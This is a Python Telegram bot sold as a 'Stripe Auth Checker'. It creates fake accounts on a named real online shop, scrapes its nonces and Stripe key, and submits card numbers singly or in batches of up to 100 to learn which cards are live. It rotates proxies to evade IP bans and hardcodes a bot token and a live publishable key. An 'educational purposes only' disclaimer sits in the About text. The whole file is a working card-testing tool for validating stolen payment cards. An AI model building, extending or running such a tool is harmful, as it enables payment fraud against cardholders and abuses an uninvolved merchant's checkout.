import asyncio
import re
import json
import random
import aiohttp
from datetime import datetime
import uuid
import warnings
from fake_useragent import UserAgent
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import logging
import os

warnings.filterwarnings('ignore')

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Bot configuration
BOT_TOKEN = "8603350550:AAF-emHT1K9WX_BppZjNodu40s3HqiiVy0Y"  # Replace with your bot token
ADMIN_IDS = []  # Add admin user IDs here for access control (leave empty for public)

# Store user sessions
user_sessions = {}

# ────────────────────────── helper functions ──────────────────────────

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except (ValueError, AttributeError):
        return None

def generate_random_email():
    import string
    username = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
    number = random.randint(100, 9999)
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
    return f"{username}{number}@{random.choice(domains)}"

def generate_guid():
    return str(uuid.uuid4())

def parse_proxy_line(line: str) -> str or None:
    line = line.strip()
    if not line:
        return None
    protocol = 'http'
    if '://' in line:
        protocol, rest = line.split('://', 1)
    else:
        rest = line
    auth = None
    address = None
    if '@' in rest:
        left, right = rest.split('@', 1)
        if ':' in left and ':' not in right:
            auth = left
            address = right
        elif ':' in right and ':' not in left:
            address = left
            auth = right
        else:
            auth = left
            address = right
    else:
        parts = rest.split(':')
        if len(parts) == 2:
            host, port = parts
            address = f"{host}:{port}"
        elif len(parts) == 4:
            host, port, user, pwd = parts
            auth = f"{user}:{pwd}"
            address = f"{host}:{port}"
        else:
            return None
    if auth:
        proxy_url = f"{protocol}://{auth}@{address}"
    else:
        proxy_url = f"{protocol}://{address}"
    return proxy_url

def load_proxies(file_path: str):
    proxies = []
    try:
        with open(file_path, 'r') as f:
            for line in f:
                proxy = parse_proxy_line(line)
                if proxy:
                    proxies.append(proxy)
    except FileNotFoundError:
        pass
    return proxies

# ──────────────────────── stripe auth logic ──────────────────────────

async def process_stripe_card(card_data, proxy_url=None):
    ua = UserAgent()
    site_url = 'https://www.eastlondonprintmakers.co.uk/my-account/add-payment-method/'
    try:
        if not site_url.startswith('http'):
            site_url = 'https://' + site_url
        timeout = aiohttp.ClientTimeout(total=70)
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            from urllib.parse import urlparse
            parsed = urlparse(site_url)
            domain = f"{parsed.scheme}://{parsed.netloc}"
            email = generate_random_email()
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'user-agent': ua.random
            }
            resp = await session.get(site_url, headers=headers, proxy=proxy_url)
            resp_text = await resp.text()
            register_nonce = (gets(resp_text, 'woocommerce-register-nonce" value="', '"') or 
                             gets(resp_text, 'id="woocommerce-register-nonce" value="', '"') or 
                             gets(resp_text, 'name="woocommerce-register-nonce" value="', '"'))
            if register_nonce:
                username = email.split('@')[0]
                password = f"Pass{random.randint(100000, 999999)}!"
                register_data = {
                    'email': email,
                    'wc_order_attribution_source_type': 'typein',
                    'wc_order_attribution_referrer': '(none)',
                    'wc_order_attribution_utm_campaign': '(none)',
                    'wc_order_attribution_utm_source': '(direct)',
                    'wc_order_attribution_utm_medium': '(none)',
                    'wc_order_attribution_utm_content': '(none)',
                    'wc_order_attribution_utm_id': '(none)',
                    'wc_order_attribution_utm_term': '(none)',
                    'wc_order_attribution_utm_source_platform': '(none)',
                    'wc_order_attribution_utm_creative_format': '(none)',
                    'wc_order_attribution_utm_marketing_tactic': '(none)',
                    'wc_order_attribution_session_entry': site_url,
                    'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'wc_order_attribution_session_pages': '1',
                    'wc_order_attribution_session_count': '1',
                    'wc_order_attribution_user_agent': headers['user-agent'],
                    'woocommerce-register-nonce': register_nonce,
                    '_wp_http_referer': '/my-account/',
                    'register': 'Register'
                }
                reg_resp = await session.post(site_url, headers=headers, data=register_data, proxy=proxy_url)
                reg_text = await reg_resp.text()
                if 'customer-logout' not in reg_text and 'dashboard' not in reg_text.lower():
                    resp = await session.get(site_url, headers=headers, proxy=proxy_url)
                    resp_text = await resp.text()
                    login_nonce = gets(resp_text, 'woocommerce-login-nonce" value="', '"')
                    if login_nonce:
                        login_data = {
                            'username': username,
                            'password': password,
                            'woocommerce-login-nonce': login_nonce,
                            'login': 'Log in'
                        }
                        await session.post(site_url, headers=headers, data=login_data, proxy=proxy_url)
            add_payment_url = site_url.rstrip('/') + '/add-payment-method/'
            if '/my-account/add-payment-method' not in add_payment_url:
                add_payment_url = f"{domain}/my-account/add-payment-method/"
            headers = {'user-agent': ua.random}
            resp = await session.get(add_payment_url, headers=headers, proxy=proxy_url)
            payment_page_text = await resp.text()
            add_card_nonce = (gets(payment_page_text, 'createAndConfirmSetupIntentNonce":"', '"') or 
                             gets(payment_page_text, 'add_card_nonce":"', '"') or 
                             gets(payment_page_text, 'name="add_payment_method_nonce" value="', '"') or 
                             gets(payment_page_text, 'wc_stripe_add_payment_method_nonce":"', '"'))
            stripe_key = (gets(payment_page_text, '"key":"pk_', '"') or 
                         gets(payment_page_text, 'data-key="pk_', '"') or 
                         gets(payment_page_text, 'stripe_key":"pk_', '"') or 
                         gets(payment_page_text, 'publishable_key":"pk_', '"'))
            if not stripe_key:
                pk_match = re.search(r'pk_live_[a-zA-Z0-9]{24,}', payment_page_text)
                if pk_match:
                    stripe_key = pk_match.group(0)
            if not stripe_key:
                stripe_key = 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
            elif not stripe_key.startswith('pk_'):
                stripe_key = 'pk_' + stripe_key
            stripe_headers = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': ua.random
            }
            stripe_data = {
                'type': 'card',
                'card[number]': card_data['number'],
                'card[cvc]': card_data['cvc'],
                'card[exp_month]': card_data['exp_month'],
                'card[exp_year]': card_data['exp_year'],
                'allow_redisplay': 'unspecified',
                'billing_details[address][country]': 'AU',
                'payment_user_agent': 'stripe.js/5e27053bf5; stripe-js-v3/5e27053bf5; payment-element; deferred-intent',
                'referrer': domain,
                'client_attribution_metadata[client_session_id]': generate_guid(),
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[elements_session_config_id]': generate_guid(),
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'guid': generate_guid(),
                'muid': generate_guid(),
                'sid': generate_guid(),
                'key': stripe_key,
                '_stripe_version': '2024-06-20'
            }
            pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, proxy=proxy_url)
            pm_json = await pm_resp.json()
            if 'error' in pm_json:
                return False, pm_json['error']['message']
            pm_id = pm_json.get('id')
            if not pm_id:
                return False, 'Failed to create Payment Method'
            confirm_headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': domain,
                'x-requested-with': 'XMLHttpRequest',
                'user-agent': ua.random
            }
            endpoints = [
                {'url': f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", 'data': {'wc-stripe-payment-method': pm_id}},
                {'url': f"{domain}/wp-admin/admin-ajax.php", 'data': {'action': 'wc_stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': pm_id}},
                {'url': f"{domain}/?wc-ajax=add_payment_method", 'data': {'wc-stripe-payment-method': pm_id, 'payment_method': 'stripe'}}
            ]
            for endp in endpoints:
                if not add_card_nonce:
                    continue
                if 'add_payment_method' in endp['url']:
                    endp['data']['woocommerce-add-payment-method-nonce'] = add_card_nonce
                else:
                    endp['data']['_ajax_nonce'] = add_card_nonce
                endp['data']['wc-stripe-payment-type'] = 'card'
                try:
                    res = await session.post(endp['url'], data=endp['data'], headers=confirm_headers, proxy=proxy_url)
                    text = await res.text()
                    if 'success' in text:
                        js = json.loads(text)
                        if js.get('success'):
                            status = js.get('data', {}).get('status')
                            return True, f"Approved (Status: {status})"
                        else:
                            error_msg = js.get('data', {}).get('error', {}).get('message', 'Declined')
                            return False, error_msg
                except:
                    continue
            return False, 'Confirmation failed on site'
    except Exception as e:
        return False, f'System Error: {str(e)}'

# ─────────────────────── single card check ───────────────────────────

async def check_card(cc, mes, ano, cvv, proxy=None):
    card_data = {'number': cc, 'exp_month': mes, 'exp_year': ano, 'cvc': cvv}
    is_approved, response_msg = await process_stripe_card(card_data, proxy_url=proxy)
    response_lower = response_msg.lower()
    if 'requires_action' in response_lower or 'succeeded' in response_lower:
        is_live = True
    elif is_approved:
        is_live = True
    else:
        is_live = False
    return {
        'cc': f"{cc}|{mes}|{ano}|{cvv}",
        'response': response_msg,
        'is_live': is_live
    }

# ─────────────────────── telegram bot handlers ──────────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send welcome message with main menu"""
    keyboard = [
        [InlineKeyboardButton("🔍 Single Check", callback_data="single")],
        [InlineKeyboardButton("📁 Mass Check", callback_data="mass")],
        [InlineKeyboardButton("⚙️ Proxy Settings", callback_data="proxy")],
        [InlineKeyboardButton("ℹ️ About", callback_data="about")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_text = (
        "✨ *Welcome to Stripe Auth Checker Bot* ✨\n\n"
        "💳 Check credit cards against Stripe payment gateway\n"
        "🔒 Fast & Secure\n"
        "⚡ Real-time results\n\n"
        "👇 *Choose an option below:*"
    )
    
    await update.message.reply_text(welcome_text, parse_mode='Markdown', reply_markup=reply_markup)

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button clicks"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    if query.data == "single":
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "💳 *Single Card Check*\n\n"
            "Send the card details in this format:\n"
            "`cc|month|year|cvv`\n\n"
            "Example:\n"
            "`4111111111111111|12|2025|123`\n\n"
            "⚠️ Use pipe (|) as separator\n"
            "📅 Month: 1-12\n"
            "📅 Year: 2024 or 24\n"
            "🔢 CVV: 3-4 digits",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        user_sessions[user_id] = {'mode': 'single'}
        
    elif query.data == "mass":
        keyboard = [
            [InlineKeyboardButton("📤 Send TXT File", callback_data="mass_file")],
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "📁 *Mass Card Check*\n\n"
            "Send a `.txt` file with one card per line\n\n"
            "Format:\n"
            "`cc|month|year|cvv`\n\n"
            "Example file content:\n"
            "`4111111111111111|12|2025|123`\n"
            "`5555555555554444|06|2026|789`\n\n"
            "⚠️ Maximum 100 cards per file",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        user_sessions[user_id] = {'mode': 'mass', 'cards': [], 'results': []}
        
    elif query.data == "mass_file":
        await query.edit_message_text(
            "📤 *Send your TXT file*\n\n"
            "Please upload a `.txt` file containing the cards.\n"
            "Maximum 100 cards allowed.\n\n"
            "🔙 Use /start to return to menu",
            parse_mode='Markdown'
        )
        user_sessions[user_id] = {'mode': 'mass_waiting'}
        
    elif query.data == "proxy":
        proxy_count = len(user_sessions.get(user_id, {}).get('proxies', []))
        keyboard = [
            [InlineKeyboardButton("📥 Load Proxy File", callback_data="proxy_load")],
            [InlineKeyboardButton(f"📊 Loaded: {proxy_count}", callback_data="proxy_show")],
            [InlineKeyboardButton("🗑️ Clear Proxies", callback_data="proxy_clear")],
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            f"⚙️ *Proxy Settings*\n\n"
            f"📊 Current proxies loaded: `{proxy_count}`\n\n"
            "Proxies help avoid rate limiting and IP bans.\n"
            "Format (one per line):\n"
            "`http://user:pass@host:port`\n"
            "`socks5://host:port`\n"
            "`host:port`",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        
    elif query.data == "proxy_load":
        await query.edit_message_text(
            "📥 *Send Proxy File*\n\n"
            "Please upload a `.txt` file containing proxies.\n"
            "One proxy per line.\n\n"
            "Supported formats:\n"
            "• `http://user:pass@host:port`\n"
            "• `socks5://host:port`\n"
            "• `host:port`\n\n"
            "🔙 Use /start to cancel",
            parse_mode='Markdown'
        )
        user_sessions[user_id] = {'mode': 'proxy_load'}
        
    elif query.data == "proxy_show":
        proxies = user_sessions.get(user_id, {}).get('proxies', [])
        if proxies:
            proxy_list = "\n".join([f"• `{p[:50]}...`" for p in proxies[:10]])
            text = f"📊 *Loaded Proxies:* {len(proxies)}\n\n{proxy_list}"
            if len(proxies) > 10:
                text += f"\n\n*... and {len(proxies)-10} more*"
        else:
            text = "⚠️ *No proxies loaded*"
        
        keyboard = [[InlineKeyboardButton("🔙 Back to Proxy Settings", callback_data="proxy")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=reply_markup)
        
    elif query.data == "proxy_clear":
        if user_id in user_sessions:
            if 'proxies' in user_sessions[user_id]:
                del user_sessions[user_id]['proxies']
        await query.edit_message_text(
            "✅ *Proxies cleared successfully!*\n\n"
            "🔙 Returning to proxy settings...",
            parse_mode='Markdown'
        )
        await asyncio.sleep(1)
        keyboard = [
            [InlineKeyboardButton("📥 Load Proxy File", callback_data="proxy_load")],
            [InlineKeyboardButton("📊 Loaded: 0", callback_data="proxy_show")],
            [InlineKeyboardButton("🗑️ Clear Proxies", callback_data="proxy_clear")],
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "⚙️ *Proxy Settings*\n\n"
            "📊 Current proxies loaded: `0`\n\n"
            "Proxies help avoid rate limiting and IP bans.\n"
            "Format (one per line):\n"
            "`http://user:pass@host:port`\n"
            "`socks5://host:port`\n"
            "`host:port`",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        
    elif query.data == "about":
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "ℹ️ *About This Bot*\n\n"
            "🤖 *Version:* 2.0.0\n"
            "💳 *Gateway:* Stripe Auth Checker\n"
            "🔒 *Security:* SSL, Proxy Support\n"
            "⚡ *Speed:* Async Processing\n"
            "📝 *Format:* CC|MM|YYYY|CVV\n\n"
            "⚠️ *Disclaimer:*\n"
            "This bot is for educational purposes only.\n"
        "Use responsibly and comply with local laws.\n\n"
            "👨‍💻 *Developer:* Advanced Stripe Checker\n"
            "📧 Support: @Obito_uchiha77",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        
    elif query.data == "menu":
        keyboard = [
            [InlineKeyboardButton("🔍 Single Check", callback_data="single")],
            [InlineKeyboardButton("📁 Mass Check", callback_data="mass")],
            [InlineKeyboardButton("⚙️ Proxy Settings", callback_data="proxy")],
            [InlineKeyboardButton("ℹ️ About", callback_data="about")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "✨ *Stripe Auth Checker Bot* ✨\n\n"
            "💳 Check credit cards against Stripe payment gateway\n"
            "🔒 Fast & Secure\n"
            "⚡ Real-time results\n\n"
            "👇 *Choose an option below:*",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        
    elif query.data == "confirm_mass":
        if user_id not in user_sessions or user_sessions[user_id].get('mode') != 'mass_confirm':
            await query.edit_message_text("⚠️ Session expired. Use /start to begin again.")
            return
        
        cards = user_sessions[user_id].get('cards', [])
        if not cards:
            await query.edit_message_text("❌ No cards to check. Use /start to begin again.")
            return
        
        await query.edit_message_text(
            f"⚡ *Starting mass check for {len(cards)} cards...*\n\n"
            f"⏳ This may take a few moments...\n"
            f"📊 Results will appear here when complete.",
            parse_mode='Markdown'
        )
        
        proxies = user_sessions.get(user_id, {}).get('proxies', [])
        
        # Process cards
        results = []
        for i, card in enumerate(cards, 1):
            parts = card.split('|')
            if len(parts) != 4:
                results.append({
                    'cc': card,
                    'response': 'Invalid format',
                    'is_live': False
                })
                continue
            
            cc, mes, ano, cvv = parts
            proxy = random.choice(proxies) if proxies else None
            result = await check_card(cc, mes, ano, cvv, proxy=proxy)
            results.append(result)
            
            # Send progress update every 5 cards
            if i % 5 == 0:
                await query.edit_message_text(
                    f"⚡ *Checking cards...*\n\n"
                    f"📊 Progress: `{i}/{len(cards)}`\n"
                    f"✅ Approved: `{sum(1 for r in results if r['is_live'])}`\n"
                    f"❌ Declined: `{i - sum(1 for r in results if r['is_live'])}`",
                    parse_mode='Markdown'
                )
        
        # Format results
        approved = [r for r in results if r['is_live']]
        declined = [r for r in results if not r['is_live'] and 'Invalid' not in r['response']]
        invalid = [r for r in results if 'Invalid' in r['response']]
        
        result_text = (
            f"📊 *Mass Check Results*\n"
            f"{'='*30}\n\n"
            f"✅ *Approved:* `{len(approved)}`\n"
            f"❌ *Declined:* `{len(declined)}`\n"
            f"⚠️ *Invalid:* `{len(invalid)}`\n"
            f"📊 *Total:* `{len(results)}`\n\n"
        )
        
        if approved:
            result_text += "*✅ Approved Cards:*\n"
            for card in approved[:10]:  # Show first 10
                result_text += f"• `{card['cc']}`\n"
                result_text += f"  ↳ {card['response'][:50]}\n"
            if len(approved) > 10:
                result_text += f"\n*... and {len(approved)-10} more approved*\n"
        
        if declined and len(declined) <= 5:
            result_text += "\n*❌ Declined Cards:*\n"
            for card in declined[:5]:
                result_text += f"• `{card['cc']}`\n"
                result_text += f"  ↳ {card['response'][:50]}\n"
        
        keyboard = [[InlineKeyboardButton("🔙 Main Menu", callback_data="menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Split message if too long
        if len(result_text) > 4000:
            result_text = result_text[:3500] + "\n\n... (truncated, check console for full results)"
        
        await query.edit_message_text(result_text, parse_mode='Markdown', reply_markup=reply_markup)
        
        # Clean up session
        if user_id in user_sessions:
            del user_sessions[user_id]

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text messages"""
    user_id = update.message.from_user.id
    text = update.message.text.strip()
    
    if user_id not in user_sessions:
        await update.message.reply_text("⚠️ Please use /start to begin.")
        return
    
    mode = user_sessions[user_id].get('mode')
    
    if mode == 'single':
        # Parse card
        parts = text.split('|')
        if len(parts) != 4:
            await update.message.reply_text(
                "❌ *Invalid format!*\n\n"
                "Please use:\n`cc|month|year|cvv`\n\n"
                "Example:\n`4111111111111111|12|2025|123`",
                parse_mode='Markdown'
            )
            return
        
        cc, mes, ano, cvv = parts
        proxies = user_sessions.get(user_id, {}).get('proxies', [])
        proxy = random.choice(proxies) if proxies else None
        
        status_msg = await update.message.reply_text(
            "⚡ *Checking card...*\n⏳ Please wait...",
            parse_mode='Markdown'
        )
        
        result = await check_card(cc, mes, ano, cvv, proxy=proxy)
        
        if result['is_live']:
            status = "✅ *APPROVED* ✅"
            emoji = "🟢"
        else:
            status = "❌ *DECLINED* ❌"
            emoji = "🔴"
        
        response_text = (
            f"{emoji} *Card Check Result* {emoji}\n"
            f"{'='*35}\n\n"
            f"💳 *Card:* `{result['cc']}`\n"
            f"📌 *Status:* {status}\n"
            f"💬 *Response:* `{result['response'][:100]}`\n"
            f"{'='*35}\n\n"
            f"🔙 Use /start to check another card"
        )
        
        await status_msg.edit_text(response_text, parse_mode='Markdown')
        
    elif mode == 'mass_confirm':
        # This is handled by button callback
        pass
    else:
        await update.message.reply_text("⚠️ Please use the menu buttons. Send /start to begin.")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle file uploads"""
    user_id = update.message.from_user.id
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a `.txt` file only.")
        return
    
    if user_id not in user_sessions:
        await update.message.reply_text("⚠️ Please use /start first.")
        return
    
    mode = user_sessions[user_id].get('mode')
    
    if mode == 'mass_waiting':
        # Download and parse file
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        content = file_content.decode('utf-8')
        
        cards = [line.strip() for line in content.split('\n') if line.strip()]
        
        if len(cards) > 100:
            await update.message.reply_text(
                f"❌ Too many cards! Maximum 100 cards allowed.\n"
                f"You sent: {len(cards)} cards.\n"
                f"Please split into multiple files."
            )
            return
        
        invalid_cards = []
        valid_cards = []
        for card in cards:
            if len(card.split('|')) != 4:
                invalid_cards.append(card)
            else:
                valid_cards.append(card)
        
        if invalid_cards:
            await update.message.reply_text(
                f"⚠️ Found {len(invalid_cards)} invalid cards.\n"
                f"✅ Valid cards: {len(valid_cards)}"
            )
        
        if not valid_cards:
            await update.message.reply_text("❌ No valid cards found. Please check format.")
            return
        
        user_sessions[user_id] = {
            'mode': 'mass_confirm',
            'cards': valid_cards
        }
        
        keyboard = [
            [InlineKeyboardButton("✅ Start Mass Check", callback_data="confirm_mass")],
            [InlineKeyboardButton("❌ Cancel", callback_data="menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"📊 *File Loaded Successfully*\n\n"
            f"📝 *Cards found:* `{len(valid_cards)}`\n"
            f"🔍 *Check with proxies:* {'Yes' if user_sessions.get(user_id, {}).get('proxies') else 'No'}\n\n"
            f"⚠️ *Ready to check?*",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        
    elif mode == 'proxy_load':
        # Download and parse proxy file
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        content = file_content.decode('utf-8')
        
        proxies = []
        for line in content.split('\n'):
            proxy = parse_proxy_line(line.strip())
            if proxy:
                proxies.append(proxy)
        
        if proxies:
            if 'proxies' not in user_sessions[user_id]:
                user_sessions[user_id]['proxies'] = []
            user_sessions[user_id]['proxies'] = proxies
            
            await update.message.reply_text(
                f"✅ *Proxies loaded successfully!*\n\n"
                f"📊 Total proxies: `{len(proxies)}`\n\n"
                f"🔙 Use /start to return to menu",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text(
                "❌ *No valid proxies found!*\n\n"
                "Please check your proxy file format.\n\n"
                "Supported formats:\n"
                "• `http://user:pass@host:port`\n"
                "• `socks5://host:port`\n"
                "• `host:port`",
                parse_mode='Markdown'
            )
        
        # Reset mode
        user_sessions[user_id]['mode'] = None

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Log errors"""
    logger.error(f"Update {update} caused error {context.error}")

def main():
    """Start the bot"""
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.add_error_handler(error_handler)
    
    # Start bot
    print("🤖 Bot is starting...")
    print(f"📊 Bot token: {BOT_TOKEN[:10]}...")
    print("✅ Bot is running! Press Ctrl+C to stop.")
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
              
